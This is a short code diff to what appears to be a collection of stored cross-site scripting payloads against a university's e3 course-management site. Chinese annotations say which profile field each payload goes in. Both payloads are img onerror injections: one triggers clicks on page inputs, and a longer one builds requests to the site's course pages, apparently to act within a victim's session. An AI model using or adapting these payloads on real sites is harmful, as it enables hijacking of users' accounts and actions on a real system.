@@ -1,3 +1,7 @@
+填在MSN中(因為MSN限制字數50)
+<img src=x onerror=$(`input`).click()>
+
+填在自我介紹中
 <img src=x onerror='
   var url=`https://e3.nctu.edu.tw/NCTU_Easy_E3P/lms31/enter_course_index.aspx`;
   var path=[`https://e3.nctu.edu.tw/NCTU_Easy_E3P/LMS31/WebResource.axd?d=LDvnB8eLAotFsch8qzA2LB11aWam-imRFDGWUmdyz7H4pZ-H8jiEy0r6ZDUVTr3FHW7a3zJq7HR--8Pt-yxLTGLTGSQ1&t=636650918320184522`,
@@ -35,4 +39,4 @@
   }
 '>
 
-<img src=x onerror=$(`input`).click()>
+
